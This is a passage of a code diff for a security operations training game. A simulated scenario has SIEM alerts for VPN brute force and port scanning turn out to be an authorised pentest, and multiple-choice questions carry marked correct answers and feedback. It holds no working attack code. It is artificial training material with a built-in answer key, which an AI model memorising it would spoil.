+     siemData:{alerts:[
+       {id:"PT-001",sev:"CRITICAL",time:"14:00:02",rule:"BRUTE_FORCE_VPN",msg:"1,200 failed auth attempts in 2 min from 103.22.14.88 against VPN portal",key:true,
+        det:{"Source IP":"103.22.14.88","Target":"VPN portal — vpn.corp.in","Attempts":"1,200 in 2 minutes","Usernames tried":"admin, administrator, vpn-user, test, guest","Risk Score":"88/100","Geo":"Bangalore, India (not abroad)"}},
+       {id:"PT-002",sev:"HIGH",time:"14:00:44",rule:"VULNERABILITY_SCAN",msg:"Full port scan from 103.22.14.88 against 10.0.0.0/24",
+        det:{"Scan type":"TCP SYN scan — all 65,535 ports","Target":"10.0.0.0/24 (entire internal subnet)","Source":"103.22.14.88","Pattern":"Matches Nmap scan signature"}},
+     ]},
+     decision:{q:"Before escalating: check if there is a scheduled pentest today. IP is in Bangalore — same city as HQ. What do you do first?",opts:[
+       {t:"Check the change management system for scheduled pentests before escalating",c:true,w:"Correct. A Bangalore IP running structured brute force + Nmap scans during business hours screams 'scheduled pentest'. Check the calendar first — 30 seconds to prevent a false alarm escalation."},
+       {t:"Block 103.22.14.88 immediately — no time to check",c:false,w:"Wrong. If this is your authorised pentest team, you just blocked your own security assessment and will have an angry call from the CISO."},
+       {t:"Escalate to CISO — this is a major attack",c:false,w:"Wrong. Escalating without checking for a scheduled test will embarrass you and the SOC. 30-second CMDB check first."},
+     ]}},
+    {id:"edr",phase:"INVESTIGATION",phaseClass:"ph-i",xp:20,icon:"✅",
+     title:"Verify: this is your authorised pentest team",
+     brief:"Change management shows: PT-2026-0341 — authorised pentest by SecureForce Pvt Ltd, 14:00–18:00 today. IP 103.22.14.88 is their declared source IP. Confirm.",
+     procData:{host:"103.22.14.88 (SecureForce pentest team)",procs:[
+       {n:"Pentest engagement",pid:1101,d:0,s:"normal",info:{"Company":"SecureForce Pvt Ltd (authorised pentest vendor)","Scope":"VPN portal + internal network 10.0.0.0/24","Change ticket":"PT-2026-0341 — approved by CISO","Declared source IP":"103.22.14.88 (matches)","Window":"14:00–18:00 today","Verdict":"AUTHORISED — false positive"}},
+       {n:"Brute force activity",pid:1102,d:1,s:"normal",info:{"Tool":"Hydra (standard pentest tool)","Target":"VPN portal","Username list":"Common default credentials","Purpose":"Testing lockout policy and default credential prevention","Verdict":"Authorised testing — expected activity"}},
+     ],hashTarget:{hash:"PT-2026-0341",score:0,family:"Authorised pentest — SecureForce",detections:"False positive",c2:"N/A"}},
+     decision:{q:"Confirmed authorised pentest, correct IP, valid change ticket. What do you do with the 1,200 alerts?",opts:[
+       {t:"Close as false positive, add pentest IP to suppression list for duration, document in ticket",c:true,w:"Correct. Close the false positive, suppress alerts from the pentest IP for the engagement window, document everything. Review pentest findings when SecureForce sends their report."},
+       {t:"Leave the alerts open — pentest might find something",c:false,w:"Wrong. Leaving 1,200 false positive alerts open pollutes your SIEM and buries real alerts. Close confirmed false positives promptly."},
+       {t:"Stop the pentest — too noisy",c:false,w:"Wrong. The pentest is authorised by the CISO. The SOC does not override CISO-approved activities. Suppress the alerts and let the test run."},
+     ]}},
+    {id:"report",phase:"CLOSE",phaseClass:"ph-cl",xp:10,icon:"📋",
+     title:"Close the false positive — pentest coordination",
+     brief:"Document and recommend better coordination between pentest teams and SOC.",
+     reportData:{"Incident ID":"INC-2026-0591","Classification":"FALSE POSITIVE","Activity":"Authorised pentest — SecureForce Pvt Ltd","Change Ticket":"PT-2026-0341","Duration":"14:00–18:00","Recommendation":"Add pentest IPs to SOC calendar at engagement start","Status":"CLOSED"},
+     decision:{q:"How do you prevent pentest alerts from flooding the SOC in future?",opts:[
+       {t:"Pre-coordinate with SOC: pentest team shares IPs and schedule 24 hours before engagement",c:true,w:"Correct. Pre-coordination means SOC can pre-suppress pentest IPs, focus on real threats, and still monitor pentest activity for scope violations. Standard practice."},
+       {t:"Disable SIEM during pentests",c:false,w:"Never. Disabling SIEM during a pentest means you cannot detect if the pentest team goes out of scope or if a real attacker piggybacks on the pentest window."},
+       {t:"Pentest team should work only at night to avoid noise",c:false,w:"Wrong. Night-time testing misses business-hours vulnerabilities. Pre-coordination is the right answer, not scheduling constraints."},
+     ]}},
+  ]
+},
+
+}; // end ALL_SCENARIOS
+
+// ── SELECT SCENARIO BASED ON URL PARAM ──────────────────────────
+const S = ALL_SCENARIOS[INC_ID] || ALL_SCENARIOS["INC-2026-0441"];
+
+// ── OLD S DEFINITION (replaced) ─────────────────────────────────
+const _UNUSED_OLD_S={
 function startGame(){
   document.getElementById('boot').style.opacity='0';
   setTimeout(()=>{
